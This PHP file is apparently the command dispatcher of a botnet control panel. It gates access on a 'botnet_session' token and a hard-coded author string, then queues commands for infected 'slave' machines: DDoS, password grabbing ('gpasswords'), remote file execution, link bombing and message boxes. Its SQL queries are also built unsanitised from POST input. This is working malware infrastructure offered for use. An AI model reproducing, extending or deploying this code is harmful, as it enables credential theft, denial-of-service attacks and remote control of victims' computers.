<?
session_start();
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
if($_SESSION['botnet_session'] != $security_token) 
{
echo "<script>window.location='../index.php';</script>";
}
if(file_exists("../mustafa.php")) 
{
$checker = fopen("../mustafa.php","r");
$copyrights = fgets($checker);
if ($copyrights != "mustafa Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
if(isset($_POST['command']))
{
// Needed Data
$slave_id = $_POST['slave_id'];
$command = $_POST['command'];
$refferal_link = $_POST['ref_link'];
$cmd = $command;
if($cmd == "ddos")
{
header("location: command/ddos.php?slave=".$slave_id);
}
elseif ($cmd == "msgbox")
{
header("location: command/msgbox.php?slave=".$slave_id);
}
elseif ($cmd == "openlink")
{
header("location: command/openlink.php?slave=".$slave_id);
}
elseif ($cmd == "bomblink")
{
header("location: command/bomblink.php?slave=".$slave_id);
}
elseif ($cmd == "gpasswords")
{
$result =mysql_query("SELECT status FROM commands WHERE slave_id='$slave_id' and status='pending'", $connect);
$update_query = "UPDATE slaves SET command='gpasswords' WHERE id='$slave_id'";
mysql_query($update_query, $connect);
$add_command = "INSERT INTO  commands (slave_id, command, status, content)
VALUES ('$slave_id', 'gpasswords', 'pending', 'null')";
mysql_query($add_command, $connect);
header("location: command/gpasswords.php?slave=".$slave_id);
}
elseif ($cmd == "excutefile")
{
header("location: command/excutefile.php?slave=".$slave_id);
}
elseif ($cmd == "fbomb")
{
header("location: command/fbomb.php?slave=".$slave_id);
}
else {
// Perform Action
$result =mysql_query("SELECT status FROM commands WHERE slave_id='$slave_id' and status='pending'", $connect);
$update_query = "UPDATE slaves SET command='$cmd' WHERE id='$slave_id'";
mysql_query($update_query, $connect);
$add_command = "INSERT INTO  commands (slave_id, command, status, content)
VALUES ('$slave_id', '$cmd', 'pending', 'null')";
mysql_query($add_command, $connect);
header("location: $refferal_link");
}
}
?>